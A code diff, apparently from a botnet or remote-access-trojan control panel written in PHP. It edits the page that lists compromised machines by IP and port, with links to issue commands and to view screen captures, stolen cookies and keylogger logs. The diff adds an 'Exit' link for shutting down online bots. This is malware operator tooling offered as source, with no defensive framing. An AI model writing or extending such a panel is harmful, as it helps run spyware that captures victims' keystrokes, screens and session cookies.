@@ -206,11 +206,12 @@ echo '
               <th class="content_table-th">Port</th>
               <th class="content_table-th">Control</th>
               <th class="content_table-th">Status</th>
-			  <th class="content_table-th">CMD</th>
-			  <th class="content_table-th">Capture</th>
-			  <th class="content_table-th">Cookies</th>
-			  <th class="content_table-th">Keylogger</th>
-        
+              <th class="content_table-th">CMD</th>
+              <th class="content_table-th">Capture</th>
+              <th class="content_table-th">Cookies</th>
+              <th class="content_table-th">Keylogger</th>
+              <th class="content_table-th">Exit</th>
+      
             </tr>';
 
 // <tr class="content_table-tr">
@@ -232,8 +233,9 @@ while ($stmt->fetch()) {
   $keylogger = "<a style='color:#00ff00;text-decoration:underline;' href='../php/viewKeylogger.php?ID=" . $ID . "'>view</a>";
   $capture = "<a style='color:#00ff00;text-decoration:underline;' href='../php/viewCapture.php?ID=" . $ID . "'>view</a>";
 
+  $exit = $status == 1 ? "<a style='color:#00ff00;text-decoration:underline;' href='../php/exitBot.php?ID=" . $ID . "'>exit</a>": "";
 
-  echo '<td class="content_table-td">' . $ID . '</td> <td class="content_table-td">' . $ip . '</td> <td class="content_table-td">' . $port . '</td> <td class="content_table-td">' . $administer . '</td> <td class="content_table-td">' . $status_display  . '</td><td class="content_table-td"> ' . $cmd . '</td><td class="content_table-td"> ' . $capture . '</td><td class="content_table-td"> ' . $cookies . '</td><td class="content_table-td"> ' . $keylogger . '</td>';
+  echo '<td class="content_table-td">' . $ID . '</td> <td class="content_table-td">' . $ip . '</td> <td class="content_table-td">' . $port . '</td> <td class="content_table-td">' . $administer . '</td> <td class="content_table-td">' . $status_display  . '</td><td class="content_table-td"> ' . $cmd . '</td><td class="content_table-td"> ' . $capture . '</td><td class="content_table-td"> ' . $cookies . '</td><td class="content_table-td"> ' . $keylogger . '</td><td class="content_table-td"> ' . $exit . '</td>';
   echo '</tr>';
 }
 echo '</table></div>';
